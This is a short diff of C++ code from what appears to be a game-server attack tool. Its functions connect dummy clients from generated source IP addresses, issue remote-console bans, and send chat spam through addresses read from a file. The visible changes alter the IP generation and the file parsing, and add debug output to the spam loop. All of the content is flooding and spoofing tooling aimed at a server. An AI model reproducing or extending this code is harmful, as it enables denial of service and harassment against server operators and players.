@@ -245,7 +245,7 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 
 	for (int k = 0; k < Amount; k++)
 	{
-		m_FromIP[k] = inet_addr(GenIPChar());
+		m_FromIP[k] = genip();//inet_addr(GenIPChar());
 	}
 
 	m_FromPort = htons(1111);
@@ -386,10 +386,14 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 void SpamIPs(const char *IP, int Port)
 {
 	std::ifstream File("ips.txt");
-
+	printf("start\n");
 	if(!File)
 		return;
 
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	printf("start2\n");
 	std::string Line;
 	while(std::getline(File, Line))
 	{
@@ -400,7 +404,7 @@ void SpamIPs(const char *IP, int Port)
 
 		for(int i = 0; i < strlen(Line.c_str()); i++)
 		{
-			if(Line.c_str()[i] == ' ')
+			if(Line.c_str()[i] == ':')
 			{
 				Cmd++;
 				Char = 0;
@@ -424,7 +428,10 @@ void SpamIPs(const char *IP, int Port)
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackSay(&buffer[0], 0, aCmd[0], 0);
 		SendData((const char*)buffer, BufferSize, 0);
+
+		printf("Send through %s %d\n", aCmd[0], atoi(aCmd[1]));
 	}
+	printf("End\n");
 }
 
 void Tick()
